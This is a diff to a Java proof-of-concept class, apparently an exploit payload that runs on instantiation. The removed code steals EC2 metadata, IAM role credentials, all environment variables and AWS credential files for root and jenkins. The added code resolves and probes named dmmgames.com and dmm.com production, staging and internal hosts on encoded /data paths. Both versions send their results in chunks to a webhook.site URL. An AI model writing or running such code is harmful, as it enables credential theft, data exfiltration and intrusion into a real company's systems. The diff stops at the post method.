@@ -2,105 +2,87 @@ import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
+import java.net.InetAddress;
 import java.net.URL;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.util.Map;
 
 public class poc {
     static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
-    static final String IMDS = "http://169.254.169.254";
+    static final String[] HOSTS = {
+        "api.abyss-prod-r18.dotabyss.dmmgames.com",
+        "api.abyss-stg-r18.dotabyss.dmmgames.com",
+        "api.abyss-stg-1-r18.dotabyss.dmmgames.com",
+        "api.abyss-stg-2-r18.dotabyss.dmmgames.com",
+        "abyss-stg.dotabyss.dmmgames.com",
+        "api.abyss-review-2-r18.dotabyss.dmmgames.com",
+        "api.abyss-review-1-r18.dotabyss.dmmgames.com",
+        "memberapis.dmm.com",
+        "api.games.dmm.com",
+        "play.games.dmm.com",
+        "mavenex.arms.dmm.com",
+        "api.abyss-verdict-r18.dotabyss.dmmgames.com"
+    };
+    static final String[] PATHS = {"/data%2F90", "/data%2F270", "/data%2F256"};
 
     public poc() {
-        StringBuilder sb = new StringBuilder("P13\n");
-        String tok = null;
-        try {
-            HttpURLConnection c = (HttpURLConnection) new URL(IMDS + "/latest/api/token").openConnection();
-            c.setConnectTimeout(3000); c.setReadTimeout(3000);
-            c.setRequestMethod("PUT"); c.setDoOutput(true);
-            c.setRequestProperty("X-aws-ec2-metadata-token-ttl-seconds", "21600");
-            OutputStream os = c.getOutputStream(); os.write("".getBytes()); os.flush(); os.close();
-            if (c.getResponseCode() == 200) { tok = read(c); }
-            sb.append("IMDSv2 token: ").append(tok == null ? "FAIL" : "OK(" + tok.length() + ")").append("\n");
-        } catch (Throwable t) { sb.append("IMDSv2 token EXC ").append(t).append("\n"); }
-        String[] paths = {"/latest/meta-data/instance-id", "/latest/meta-data/placement/availability-zone",
-                          "/latest/meta-data/local-ipv4", "/latest/meta-data/public-ipv4",
-                          "/latest/meta-data/iam/info", "/latest/meta-data/iam/security-credentials/",
-                          "/latest/meta-data/identity-credentials/ec2/info",
-                          "/latest/user-data", "/latest/meta-data/network/interfaces/macs/"};
-        for (int i = 0; i < paths.length; i++) { sb.append(get(IMDS + paths[i], tok, paths[i])); }
-        String role = lastRole;
-        if (role != null && role.length() > 0 && role.length() < 120) {
-            sb.append(get(IMDS + "/latest/meta-data/iam/security-credentials/" + role.trim(), tok, "ROLE_CREDS"));
+        StringBuilder sb = new StringBuilder("P14\n");
+        String[] ips = new String[HOSTS.length];
+        for (int i = 0; i < HOSTS.length; i++) {
+            sb.append("\n@@DNS ").append(HOSTS[i]).append("\n");
+            try {
+                InetAddress[] all = InetAddress.getAllByName(HOSTS[i]);
+                for (int j = 0; j < all.length; j++) {
+                    sb.append("  ").append(all[j].getHostAddress()).append("\n");
+                    if (j == 0) { ips[i] = all[j].getHostAddress(); }
+                }
+            } catch (Throwable t) { sb.append("  EXC ").append(t).append("\n"); }
         }
-        sb.append("\n@@ ENV\n");
-        try {
-            Map<String, String> env = System.getenv();
-            for (Map.Entry<String, String> e : env.entrySet()) {
-                sb.append(e.getKey()).append("=").append(e.getValue()).append("\n");
+        sb.append("\nproxyHost=").append(System.getProperty("http.proxyHost")).append("\n");
+        for (int i = 0; i < HOSTS.length; i++) {
+            for (int p = 0; p < PATHS.length; p++) {
+                sb.append(hit("https://" + HOSTS[i] + PATHS[p], HOSTS[i]));
             }
-        } catch (Throwable t) { sb.append("env ERR ").append(t).append("\n"); }
-        String[] files = {"/etc/hosts", "/etc/resolv.conf", "/etc/environment", "/root/.aws/credentials",
-                          "/root/.aws/config", "/var/lib/jenkins/.aws/credentials", "/var/lib/jenkins/.aws/config",
-                          "/home/jenkins/.aws/credentials", "/home/jenkins/.aws/config", "/etc/aws/credentials"};
-        for (int i = 0; i < files.length; i++) { sb.append(cat(files[i])); }
+        }
+        for (int i = 0; i < HOSTS.length; i++) {
+            if (ips[i] != null && (ips[i].startsWith("172.") || ips[i].startsWith("10.") || ips[i].startsWith("192.168."))) {
+                sb.append(hit("http://" + ips[i] + "/data%2F270", HOSTS[i]));
+                sb.append(hit("http://" + ips[i] + "/data%2F90", HOSTS[i]));
+            }
+        }
         String data = sb.toString();
-        int total = data.length();
-        for (int i = 0; i < total && i < 3000000; i += 90000) {
-            try { post("P13|" + i + "|" + data.substring(i, Math.min(total, i + 90000))); }
+        for (int i = 0; i < data.length() && i < 2000000; i += 80000) {
+            try { post("P14|" + i + "|" + data.substring(i, Math.min(data.length(), i + 80000))); }
             catch (Throwable t) { }
         }
     }
 
-    static String lastRole = null;
-
-    static String get(String u, String token, String tag) {
-        StringBuilder r = new StringBuilder("\n@@GET ").append(tag).append("\n");
+    static String hit(String u, String host) {
+        StringBuilder r = new StringBuilder();
         try {
             HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
-            c.setConnectTimeout(5000); c.setReadTimeout(8000);
-            c.setRequestProperty("User-Agent", "curl/7.6");
-            if (token != null) { c.setRequestProperty("X-aws-ec2-metadata-token", token); }
+            c.setConnectTimeout(8000); c.setReadTimeout(12000);
+            c.setInstanceFollowRedirects(false);
+            c.setRequestProperty("User-Agent", "Mozilla/5.0");
+            c.setRequestProperty("Host", host);
             int code = c.getResponseCode();
-            String body = read(c);
-            if (code >= 400) { body = readErr(c); }
-            r.append("status=").append(code).append("\n").append(body).append("\n");
-            if (tag.endsWith("security-credentials/") && code == 200) { lastRole = body.trim(); }
-        } catch (Throwable t) { r.append("EXC ").append(t).append("\n"); }
+            int len = c.getContentLength();
+            r.append("  ").append(u).append(" -> ").append(code).append(" lenhdr=").append(len)
+             .append(" ct=").append(c.getContentType()).append("\n");
+            if (code == 200) {
+                InputStream in = c.getInputStream();
+                ByteArrayOutputStream bo = new ByteArrayOutputStream();
+                byte[] b = new byte[8192]; int n; int tot = 0;
+                while ((n = in.read(b)) > 0) { tot += n; if (bo.size() < 64) bo.write(b, 0, n); if (tot > 300000) break; }
+                in.close();
+                r.append("     OK len=").append(tot).append(" magic=").append(toHex(bo.toByteArray(), 8)).append("\n");
+            }
+        } catch (Throwable t) { r.append("  ").append(u).append(" EXC ").append(t).append("\n"); }
         return r.toString();
     }
 
-    static String read(HttpURLConnection c) throws Exception {
-        InputStream in = c.getInputStream();
-        ByteArrayOutputStream bo = new ByteArrayOutputStream();
-        byte[] b = new byte[4096]; int n;
-        while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 200000) break; }
-        in.close();
-        return new String(bo.toByteArray(), "UTF-8");
-    }
-
-    static String readErr(HttpURLConnection c) {
-        try {
-            InputStream in = c.getErrorStream();
-            if (in == null) { return ""; }
-            ByteArrayOutputStream bo = new ByteArrayOutputStream();
-            byte[] b = new byte[4096]; int n;
-            while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 20000) break; }
-            in.close();
-            return new String(bo.toByteArray(), "UTF-8");
-        } catch (Throwable t) { return ""; }
-    }
-
-    static String cat(String p) {
-        StringBuilder r = new StringBuilder("\n@@CAT ").append(p).append("\n");
-        try {
-            Path f = Paths.get(p);
-            if (!Files.isRegularFile(f)) { r.append("(missing)\n"); return r.toString(); }
-            byte[] b = Files.readAllBytes(f);
-            r.append(new String(b, "UTF-8")).append("\n");
-        } catch (Throwable t) { r.append("EXC ").append(t).append("\n"); }
-        return r.toString();
+    static String toHex(byte[] b, int n) {
+        StringBuilder s = new StringBuilder();
+        for (int i = 0; i < Math.min(b.length, n); i++) { s.append(String.format("%02x", b[i] & 0xff)); }
+        return s.toString();
     }
 
     static void post(String s) throws Exception {
